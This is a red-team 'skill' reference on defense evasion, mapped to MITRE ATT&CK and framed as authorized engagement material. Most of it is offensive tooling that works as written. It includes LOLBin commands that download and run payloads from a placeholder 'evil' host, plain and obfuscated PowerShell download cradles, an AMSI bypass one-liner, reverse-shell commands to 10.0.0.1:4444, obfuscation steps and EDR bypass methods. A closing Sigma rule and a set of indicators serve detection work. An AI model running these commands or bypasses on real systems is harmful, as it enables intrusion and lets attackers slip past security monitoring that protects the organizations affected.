# Skill: Defense Evasion

> Patterns and techniques for evading defensive controls during authorized Red Team engagements, mapped to MITRE ATT&CK Tactic TA0005 (Defense Evasion). Includes Living-off-the-Land techniques, payload obfuscation, and strategies for bypassing AV/EDR.

---

## Overview

Defense evasion is often the difference between a detected and an undetected simulated attack. This skill documents techniques for operating stealthily within a target environment, using native tools (Living-off-the-Land), obfuscation, and detection-bypass methods. All techniques are mapped to MITRE ATT&CK for reporting and purple-team validation.

> [!CAUTION]
> These techniques are documented exclusively for **authorized Red Team engagements** and **detection validation**. Every technique includes detection indicators so Blue Teams can build corresponding rules.

---

## Living-off-the-Land Binaries (LOLBins)

Living-off-the-Land means using legitimate, pre-installed system utilities for malicious purposes. These binaries are trusted by the OS and often whitelisted by security products.

### Windows LOLBins (LOLBAS)

Reference: [LOLBAS Project](https://lolbas-project.github.io/)

| Binary | ATT&CK Technique | Capability | Example |
|--------|------------------|------------|---------|
| `certutil.exe` | T1140, T1105 | Download, decode, encode files | `certutil -urlcache -f http://evil/payload.exe payload.exe` |
| `mshta.exe` | T1218.005 | Execute HTA payloads | `mshta http://evil/payload.hta` |
| `rundll32.exe` | T1218.011 | Execute DLL entry points | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"` |
| `regsvr32.exe` | T1218.010 | Execute COM scriptlets (Squiblydoo) | `regsvr32 /s /n /u /i:http://evil/payload.sct scrobj.dll` |
| `msbuild.exe` | T1127.001 | Execute inline C# tasks | `msbuild.exe inline_task.csproj` |
| `wmic.exe` | T1047 | Remote command execution, process creation | `wmic process call create "cmd.exe /c payload"` |
| `bitsadmin.exe` | T1197, T1105 | Download and execute files | `bitsadmin /transfer job /download /priority normal http://evil/payload %TEMP%\payload.exe` |
| `cmstp.exe` | T1218.003 | UAC bypass, code execution | `cmstp.exe /ni /s payload.inf` |
| `installutil.exe` | T1218.004 | Execute .NET assemblies | `installutil.exe /logfile= /LogToConsole=false /U payload.exe` |
| `powershell.exe` | T1059.001 | Script execution, download cradles | See PowerShell section below |

#### PowerShell Evasion Patterns

```powershell
# Download cradle (basic)
IEX (New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')

# Download cradle (evasive — avoids string-based detection)
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
IEX ($wc.DownloadString("h"+"ttp://evil/pay"+"load.ps1"))

# AMSI bypass (basic — frequently signatured, use as template)
# Note: Specific bypasses evolve rapidly — research current techniques
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Constrained Language Mode check
$ExecutionContext.SessionState.LanguageMode

# AppLocker bypass via alternate PowerShell hosts
# Use PowerShell SDK in a custom .NET application
```

### Linux / macOS LOLBins (GTFOBins)

Reference: [GTFOBins](https://gtfobins.github.io/)

| Binary | Capability | Example |
|--------|------------|---------|
| `curl` / `wget` | File download, data exfiltration | `curl http://evil/payload -o /tmp/payload` |
| `python` / `python3` | Reverse shell, code execution | `python3 -c 'import os; os.system("/bin/bash")'` |
| `perl` | Reverse shell, code execution | `perl -e 'exec "/bin/bash"'` |
| `ruby` | Reverse shell | `ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i; exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'` |
| `nc` / `ncat` | Reverse/bind shells, file transfer | `nc -e /bin/bash 10.0.0.1 4444` |
| `openssl` | Encrypted reverse shell | `openssl s_client -quiet -connect 10.0.0.1:4444 \| /bin/bash` |
| `socat` | Encrypted interactive shell | `socat exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:10.0.0.1:4444` |
| `tar` | Command execution via checkpoint | `tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| `find` | Command execution | `find . -exec /bin/bash -p \; -quit` |
| `vim` / `vi` | Shell escape | `:!/bin/bash` |
| `awk` | Command execution | `awk 'BEGIN {system("/bin/bash")}'` |
| `osascript` (macOS) | AppleScript execution | `osascript -e 'do shell script "whoami"'` |
| `ssh` | Port forwarding, tunneling | `ssh -D 1080 -f -N pivot@target` (SOCKS proxy) |

---

## Payload Obfuscation

### String Obfuscation Techniques

| Technique | ATT&CK | Description | Example |
|-----------|--------|-------------|---------|
| **Encoding** | T1027.013 | Base64, hex, ROT13 encoding | `echo "payload" \| base64` |
| **String concatenation** | T1027 | Break malicious strings into parts | `"po" + "wer" + "shell"` |
| **Variable substitution** | T1027 | Use environment variables as string components | `%COMSPEC% /c ...` |
| **Character replacement** | T1027 | Replace characters with escape sequences or alternates | `p^o^w^e^r^s^h^e^l^l` (cmd.exe caret escape) |
| **XOR encryption** | T1027.013 | XOR payload with a key | Custom encoder/decoder stub |
| **AES encryption** | T1027.013 | Encrypt payload, decrypt at runtime | Staged decryption with embedded key |

### Binary Obfuscation

| Technique | ATT&CK | Tool | Description |
|-----------|--------|------|-------------|
| **Packing** | T1027.002 | UPX, Themida, VMProtect | Compress/encrypt binary, unpack at runtime |
| **Code signing** | T1553.002 | signtool, osslsigncode | Sign payloads with valid/stolen certificates |
| **Timestomping** | T1070.006 | touch, NtSetInformationFile | Modify file timestamps to blend with legitimate files |
| **Resource embedding** | T1027.009 | Custom tools | Embed payload in legitimate file resources |
| **Payload staging** | T1105 | Custom stagers | Small stager downloads full payload at runtime |

### PowerShell Obfuscation

Reference: [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

```
Layers of obfuscation (apply incrementally):
1. String concatenation and reordering
2. Variable name randomization
3. Encode with Base64 / SecureString
4. Use alternate invocation methods (-EncodedCommand, .Invoke())
5. Compress with Deflate/GZip then Base64
6. Wrap in scriptblock invocation
```

---

## AV/EDR Bypass Strategies

### Understanding Detection Mechanisms

| Layer | What It Detects | Bypass Strategy |
|-------|----------------|-----------------|
| **Static signatures** | Known malicious byte patterns | Obfuscation, encoding, packing, custom tooling |
| **Heuristic analysis** | Suspicious behavioral patterns in code | Mimic legitimate software behavior |
| **AMSI** (Windows) | PowerShell, VBScript, JScript content | AMSI bypass (patching, unhooking) |
| **ETW** (Windows) | Runtime event tracing | ETW patching, unhooking |
| **API hooking** | Suspicious Win32 API call sequences | Direct syscalls, unhooking, API reimplementation |
| **Behavioral analysis** | Process injection, credential access patterns | Legitimate process mimicry, timing delays |
| **Memory scanning** | In-memory malicious patterns | Encryption at rest, sleep obfuscation |
| **Network detection** | C2 protocol signatures | Domain fronting, legitimate protocol mimicry, encrypted channels |

### Evasion Technique Matrix

| Technique | ATT&CK ID | Complexity | Detection Risk | Description |
|-----------|-----------|-----------|----------------|-------------|
| Process injection | T1055 | Medium | Medium | Inject code into legitimate process (hollowing, APC, thread hijack) |
| DLL side-loading | T1574.002 | Medium | Low | Place malicious DLL where legitimate app loads it |
| Reflective DLL loading | T1620 | High | Low | Load DLL from memory without touching disk |
| Direct syscalls | T1106 | High | Low | Bypass API hooks by calling NT syscalls directly |
| Unhooking | T1562.001 | High | Medium | Restore original ntdll.dll from disk to remove EDR hooks |
| Sleep obfuscation | T1497.003 | Medium | Low | Encrypt payload in memory during sleep intervals |
| Parent PID spoofing | T1134.004 | Medium | Low | Fake parent process to blend into process tree |
| Thread stack spoofing | — | High | Low | Forge call stack to hide malicious calling context |
| ETW patching | T1562.006 | Medium | Medium | Disable Event Tracing for Windows for current process |
| AMSI patching | T1562.001 | Low | Medium | Patch AmsiScanBuffer to always return clean |

### Open-Source Evasion Tools

| Tool | Purpose | Platform |
|------|---------|----------|
| **ScareCrow** | EDR-evasive payload loader | Windows |
| **Donut** | Shellcode from PE/.NET/VBS/JS | Windows |
| **SharpBlock** | EDR DLL load blocking | Windows |
| **Freeze** | Suspended process injection payload | Windows |
| **Nimcrypt2** | PE packer/crypter in Nim | Windows |
| **PEzor** | PE packer with syscalls | Windows |
| **Mangle** | Payload manipulation (metadata, signing) | Windows |
| **Garble** | Go binary obfuscation | Cross-platform |
| **UPX** | Executable packer | Cross-platform |

---

## Detection Indicators (For Blue Team Validation)

Every evasion technique should have corresponding detection guidance. The following indicators help Blue Teams validate their detection capabilities:

### Process-Based Indicators

```yaml
# Sigma rule pattern for LOLBin abuse
detection:
  selection:
    Image|endswith:
      - '\certutil.exe'
      - '\mshta.exe'
      - '\regsvr32.exe'
      - '\msbuild.exe'
      - '\cmstp.exe'
    CommandLine|contains:
      - 'urlcache'
      - 'http'
      - 'decode'
      - '/i:'
  condition: selection
```

### Network-Based Indicators

```
- Unusual user agents from system processes
- DNS queries to newly registered domains (< 30 days)
- Regular-interval beaconing (±jitter analysis)
- Encoded data in DNS TXT records (DNS tunneling)
- TLS connections with self-signed or unusual certificates
- HTTP POST requests with high entropy bodies
```

### Memory-Based Indicators

```
- RWX (Read-Write-Execute) memory regions in unexpected processes
- Unbacked executable memory (no file on disk)
- Known shellcode patterns (NOP sleds, egg hunters)
- Hooked API functions (compare in-memory vs on-disk ntdll)
- Injected threads in remote processes
```

---

## Operational Security (OPSEC) Checklist

```
Before executing any evasion technique:

[ ] Confirm technique is within engagement scope (ROE)
[ ] Test in isolated lab environment first
[ ] Understand the detection surface of the technique
[ ] Have a rollback / cleanup plan
[ ] Document the technique, timing, and target for deconfliction
[ ] Coordinate with Blue Team for purple-team engagements
[ ] Verify you're not combining techniques that create unintended effects
```
